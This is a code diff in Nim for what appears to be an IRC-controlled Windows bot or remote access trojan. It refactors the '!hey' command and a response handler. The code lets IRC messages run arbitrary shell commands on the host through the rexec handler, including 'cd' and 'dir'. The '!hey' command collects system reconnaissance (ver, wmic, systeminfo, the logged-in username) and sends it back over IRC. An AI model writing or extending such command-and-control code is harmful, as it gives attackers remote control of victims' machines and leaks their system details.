@@ -85,7 +85,7 @@ proc helper_checkSendDuration(event: IrcEvent, client:AsyncIrc, msg:string): Fut
 
 ## Waits handles output from dispached functions. Required for async operations
 ## usually used to get async output from rexec
-proc helper_responseHandler(response:Future[ExecResponse], client:AsyncIrc, event:IrcEvent) {.async.} =
+proc helper_responseHandler(event:IrcEvent, client:AsyncIrc, response:Future[ExecResponse]) {.async.} =
     while not response.finished() and not response.failed():
         await sleepAsync(1000)
     
@@ -118,6 +118,10 @@ proc helper_responseHandler(response:Future[ExecResponse], client:AsyncIrc, even
     else:
         discard client.privmsg(event.origin, "cmd: future failed")
 
+
+proc helper_setResponse(output:string, exitCode:int):Future[ExecResponse] {.async.} =
+    result.output = output
+    result.exitCode = exitCode
 
 
 proc rexec_runCommand(cmd:string):Future[ExecResponse] {.async.} =
@@ -282,7 +286,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
     of "cd":
         if len(tokens) == 2:
             #response = await rexec_runCommand("echo %CD%")
-            discard helper_responseHandler(rexec_runCommand("echo %CD%"), client, event)
+            discard helper_responseHandler(event, client, rexec_runCommand("echo %CD%"))
             #caught = true
         else:
             var path = await helper_recombine(tokens,2)
@@ -293,11 +297,11 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
 
     of "cd..":
         #response = await rexec_runCommand("cd ..")
-        discard helper_responseHandler(rexec_runCommand("cd .."), client, event)
+        discard helper_responseHandler(event, client, rexec_runCommand("cd .."))
         #caught = true
     of "ls":
         #response = await rexec_runCommand("dir /w")
-        discard helper_responseHandler(rexec_runCommand("dir /w"), client, event)
+        discard helper_responseHandler(event, client, rexec_runCommand("dir /w"))
         #caught = true
     else:
         var args:string
@@ -305,7 +309,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
         
         when defined(debug): echo "ARGS: " & args
 
-        discard helper_responseHandler(rexec_runCommand(args), client, event)
+        discard helper_responseHandler(event, client, rexec_runCommand(args))
 
 
 
@@ -436,6 +440,58 @@ proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.}
 #     discard
 
 
+proc cmd_hey(event:IrcEvent, client:AsyncIrc) {.async.} =
+    var
+        win_ver = "<void>"
+        win_csd = "<void>"
+        win_sys = "<void>"
+        win_mod = "<void>"
+    
+    try:
+        var (output, _ ) = execCmdEx("cmd.exe /c ver" ,options = {poUsePath})
+        output = output.strip(chars={'\r','\n'})
+        win_ver = output
+    except OSError as e:
+        #win_ver = repr(e)
+        discard
+
+    try:
+        var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
+        output = output.strip(chars={'\r','\n'})
+        output.stripLineEnd()
+        win_csd = output
+    except OSError as e:
+        #win_csd = repr(e)
+        discard
+
+    try:
+        var (output, _ ) = execCmdEx("cmd.exe /c systeminfo" ,options = {poUsePath})
+        output = output.strip(chars={'\r','\n'})
+        output.stripLineEnd()
+        win_sys = output
+    except OSError as e:
+        #win_sys = repr(e)
+        discard
+    try:
+        var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
+        output = output.strip(chars={'\r','\n'})
+        output.stripLineEnd()
+        win_mod = output
+    except OSError as e:
+        #win_mod = repr(e)
+        discard
+    
+    var
+        finalmsg:string =   "heyyy v" & 
+                            $current_version & " as " & getEnv("USERNAME") &
+                            " VER: [" & win_ver & "]\n" &
+                            " CSD: [" & win_csd & "]\n" &
+                            " SYS: [" & win_sys & "]\n" &
+                            " MOD: [" & win_mod & "]\n" 
+
+    discard helper_responseHandler(event, client, helper_setResponse(finalmsg, 0))
+
+
 
 ## Checks if a private message was a command and calls appropriate functions
 proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
@@ -451,58 +507,9 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
 
     case tokens[0]:
     of "!hey":
-        var
-            win_ver = "<void>"
-            win_csd = "<void>"
-            win_sys = "<void>"
-            win_mod = "<void>"
-        
-        try:
-            var (output, _ ) = execCmdEx("cmd.exe /c ver" ,options = {poUsePath})
-            output = output.strip(chars={'\r','\n'})
-            win_ver = output
-        except OSError as e:
-            #win_ver = repr(e)
-            discard
-
-        try:
-            var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
-            output = output.strip(chars={'\r','\n'})
-            output.stripLineEnd()
-            win_csd = output
-        except OSError as e:
-            #win_csd = repr(e)
-            discard
-
-        try:
-            var (output, _ ) = execCmdEx("cmd.exe /c systeminfo" ,options = {poUsePath})
-            output = output.strip(chars={'\r','\n'})
-            output.stripLineEnd()
-            win_sys = output
-        except OSError as e:
-            #win_sys = repr(e)
-            discard
-        try:
-            var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
-            output = output.strip(chars={'\r','\n'})
-            output.stripLineEnd()
-            win_mod = output
-        except OSError as e:
-            #win_mod = repr(e)
-            discard
-        
-        var finalmsg:string =  "heyyy v" & 
-                        $current_version & " as " & getEnv("USERNAME") &
-                        " VER: [" & win_ver & "]" &
-                        " CSD: [" & win_csd & "]" &
-                        " SYS: [" & win_sys & "]" &
-                        " MOD: [" & win_mod & "]" 
-        finalmsg = finalmsg.strip(chars={'\r','\n'})
-        finalmsg.stripLineEnd()
-
-        discard client.privmsg(event.origin, finalmsg)
-
-    of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
+        discard cmd_hey(event, client)
+    of "!lag":
+        discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
         for i in 0..10:
             discard client.privmsg(event.origin, "TEST" & $i)
